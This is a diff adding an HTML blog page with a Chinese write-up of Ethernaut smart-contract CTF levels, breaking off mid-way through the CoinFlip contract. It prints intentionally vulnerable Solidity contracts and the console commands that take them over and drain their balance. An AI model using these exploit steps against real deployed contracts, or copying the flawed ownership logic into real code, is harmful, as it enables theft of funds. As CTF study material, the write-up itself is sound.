@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Arie">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://arieran.github.io/2023/10/05/ethernaut题解/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="0x00 Hello Ethernaut按照要求一直打就行 12345678910111213141516171819202122232425&gt; await contract.info()&lt; &quot;You will find what you need in info1().&quot;&gt; await contract.info1()&lt; &quot;Try info2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut题解">
+<meta property="og:url" content="https://arieran.github.io/2023/10/05/Ethernaut%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 Hello Ethernaut按照要求一直打就行 12345678910111213141516171819202122232425&gt; await contract.info()&lt; &quot;You will find what you need in info1().&quot;&gt; await contract.info1()&lt; &quot;Try info2">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-10-05T03:32:04.000Z">
+<meta property="article:modified_time" content="2023-10-05T03:32:48.314Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF刷题">
+<meta name="twitter:card" content="summary">
+    
+    
+        <!-- Google tag (gtag.js) -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', '');
+        </script>
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/arielogo1.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/arielogo1.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/arielogo1.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Ethernaut题解 -
+        
+        Arie&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"arieran.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":true,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true,"google_analytics":{"enable":true,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/ariewall-light.jpg","dark":"/images/ariewall-dark.jpg"},"title":"Welcome","subtitle":{"text":["祝我们","大杀四方"],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/arieran","instagram":null,"zhihu":null,"twitter":null,"email":"aran1026@163.com"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.2.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Status":{"path":"https://status.evanluo.top/","icon":"fa-regular fa-chart-bar"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/EvanNotFound/hexo-theme-redefine","Blog":"https://ohevan.com","Friends":"/friends"}},"Links":{"icon":"fa-regular fa-link","submenus":{"Link1":"https://www.levi104.com/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"努力努力","links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Arie&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    target="_blank" rel="noopener" href="https://status.evanluo.top/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-chart-bar"></i>
+                                        
+                                        状态
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/EvanNotFound/hexo-theme-redefine">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://ohevan.com">BLOG
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a href="/friends">友情链接
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-link"></i>
+                                        
+                                        链接&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.levi104.com/">LINK1
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        target="_blank" rel="noopener" href="https://status.evanluo.top/"  >
+                             
+                                
+                                    <i class="fa-regular fa-chart-bar"></i>
+                                
+                                状态
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://github.com/EvanNotFound/hexo-theme-redefine">GITHUB</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://ohevan.com">BLOG</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" href="/friends">友情链接</a>
+                            </li>
+                        
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-link"></i>
+                                
+                                链接&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://www.levi104.com/">LINK1</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                
+                  <h1 class="article-title-regular">Ethernaut题解</h1>
+                
+              </div>
+              
+                     
+            
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/ariehead.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Arie</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-10-05 11:32:04</span>
+        <span class="mobile">2023-10-05 11:32:04</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-10-05 11:32:48</span>
+            <span class="mobile">2023-10-05 11:32:48</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF%E5%88%B7%E9%A2%98/">CTF刷题</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.9k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>9 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h2 id="0x00-Hello-Ethernaut"><a href="#0x00-Hello-Ethernaut" class="headerlink" title="0x00 Hello Ethernaut"></a>0x00 Hello Ethernaut</h2><p>按照要求一直打就行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt; await contract.info()</span><br><span class="line">&lt; &quot;You will find what you need in info1().&quot;</span><br><span class="line"></span><br><span class="line">&gt; await contract.info1()</span><br><span class="line">&lt; &quot;Try info2(), but with &quot;hello&quot; as a parameter.&quot;</span><br><span class="line"></span><br><span class="line">&gt; await contract.info2(&quot;hello&quot;)</span><br><span class="line">&lt; &quot;The property infoNum holds the number of the next info method to call.&quot;</span><br><span class="line"></span><br><span class="line">&gt; await contract.infoNum()</span><br><span class="line">&lt; BN &#123;negative: 0, words: [42, empty], length: 1, red: null&#125;</span><br><span class="line"></span><br><span class="line">&gt; await contract.info42()</span><br><span class="line">&lt; &quot;theMethodName is the name of the next method.&quot;</span><br><span class="line"></span><br><span class="line">&gt; await contract.theMethodName()</span><br><span class="line">&lt; &quot;The method name is method7123949.&quot;</span><br><span class="line"></span><br><span class="line">&gt; await contract.method7123949()</span><br><span class="line">&lt; &quot;If you know the password, submit it to authenticate().&quot;</span><br><span class="line"></span><br><span class="line">&gt; await contract.password()</span><br><span class="line">&lt; &quot;ethernaut0&quot;</span><br><span class="line"></span><br><span class="line">&gt; await contract.authenticate(&quot;ethernaut0&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<p>Metamask上弹窗 点确认，提交实例，通过</p>
+<h2 id="0x01-Fallback"><a href="#0x01-Fallback" class="headerlink" title="0x01 Fallback"></a>0x01 Fallback</h2><h4 id="1-合约代码"><a href="#1-合约代码" class="headerlink" title="1.合约代码"></a>1.合约代码</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="2-通关要求"><a href="#2-通关要求" class="headerlink" title="2.通关要求"></a>2.通关要求</h4><ol>
+<li>you claim ownership of the contract &#x2F;&#x2F;成为新主人</li>
+<li>you reduce its balance to 0 &#x2F;&#x2F;清零（钱全部提走）</li>
+</ol>
+<h4 id="3-解题步骤"><a href="#3-解题步骤" class="headerlink" title="3.解题步骤"></a>3.解题步骤</h4><p>成为新主人，两个条件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br></pre></td></tr></table></figure></div>
+
+<p>先往里面存点钱</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.contribute(&#123;value: toWei(&quot;0.00001&quot;)&#125;)</span><br></pre></td></tr></table></figure></div>
+
+<p>由于1 ether&#x3D; 10^18 wei，这里使用了预设的toWei函数把0.00001 ether 转换成wei单位后传送。</p>
+<p>待交易确认后，传送以太币呼叫fallback:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.sendTransaction(&#123;value: toWei(&quot;0.00001&quot;)&#125;)</span><br></pre></td></tr></table></figure></div>
+
+<p>此时owner已经转为msg.sender，即呼叫者钱包地址了，呼叫withdraw函数把balance归零:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure></div>
+
+<p>提交。</p>
+<h4 id="4-知识点"><a href="#4-知识点" class="headerlink" title="4.知识点"></a>4.知识点</h4><p>题解参考自</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.yijinglab.com/specialized/20211104154206">https://www.yijinglab.com/specialized/20211104154206 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>Fallback函数</p>
+<p><code>fallback()</code>函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约<code>proxy contract</code>。<code>fallback()</code>声明时不需要<code>function</code>关键字，必须由<code>external</code>修饰，一般也会用<code>payable</code>修饰，用于接收ETH:<code>fallback() external payable &#123; ... &#125;</code>。</p>
+<p>我们定义一个<code>fallback()</code>函数，被触发时候会释放<code>fallbackCalled</code>事件，并输出<code>msg.sender</code>，<code>msg.value</code>和<code>msg.data</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// fallback</span><br><span class="line">fallback() external payable&#123;</span><br><span class="line">    emit fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>为了完成题目：</p>
+<p>1.调用contribute函数</p>
+<p>2.调用receive函数</p>
+<p>constructor函数是合约的构造函数，是合约在初始化的时候建立的，而sender这个全局变量代表的是当前和合约交互的用户。所以说，<strong>contructor函数的sender不可能是除了创建者之外后续用户。</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>如要调用contribute函数，则需要向合约转账，转入的eth大于1000才可以成为onwer，而且每次只能转小于0.001eth，显然不可行。</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            </span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br></pre></td></tr></table></figure></div>
+
+<p>那么如果<strong>调用receive函数，只需要转账大于0即可成为owner。</strong>那么这个receive函数怎么调用呢？</p>
+<p>这个函数明显长得就和正常的函数不一样，没有function修饰。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="0x02-Fallout"><a href="#0x02-Fallout" class="headerlink" title="0x02 Fallout"></a>0x02 Fallout</h2><h4 id="1-合约代码-1"><a href="#1-合约代码-1" class="headerlink" title="1.合约代码"></a>1.合约代码</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  /* constructor */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="2-通关要求-1"><a href="#2-通关要求-1" class="headerlink" title="2.通关要求"></a>2.通关要求</h4><p>获得合约所有权</p>
+<h4 id="3-解题步骤-1"><a href="#3-解题步骤-1" class="headerlink" title="3.解题步骤"></a>3.解题步骤</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>要获得合约所有权（成为owner）直接调用函数</p>
+<p>提交。</p>
+<h2 id="0x03-CoinFlip"><a href="#0x03-CoinFlip" class="headerlink" title="0x03 CoinFlip"></a>0x03 CoinFlip</h2><h4 id="1-合约代码-2"><a href="#1-合约代码-2" class="headerlink" title="1.合约代码"></a>1.合约代码</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 